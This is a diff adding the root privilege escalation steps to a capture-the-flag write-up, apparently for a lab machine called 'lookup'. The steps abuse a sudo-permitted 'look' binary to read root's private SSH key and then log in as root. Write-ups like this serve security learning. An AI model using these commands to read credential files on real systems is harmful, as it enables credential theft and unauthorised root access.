@@ -207,3 +207,37 @@ I Have found the → User Flag
 
 ## Privilige Escalation To Root
 
+While logged in to user → ***think*** Let’s check it’s sudo privileges
+
+    sudo -l
+
+![privilige Escalation To Root](/GOTBin.gif)
+
+![privilige Escalation To Root](/sudo.webp)
+
+
+We can now use the above command to get the id_rsa Key to get to root login directly 
+
+Usually the location for id_rsa is stored under the .ssh folder 
+
+    sudo /usr/bin/look '' /root/.ssh/id_rsa
+
+id_rsa key
+
+![id_rsa key](/id_rsa.png)
+
+Now after getting the id_rsa key , we need to save it to a file locally and give id_rsa permissions by 
+
+    chmod 600 id_rsa
+
+We have the id_rsa for root account, Let’s Login to root via SSH
+
+    ssh -i id_rsa root@lookup.thm
+
+Root access
+
+![Access root account](/root.png)
+
+Root account access, Flag obtained
+
+![Access root account](/root.gif)
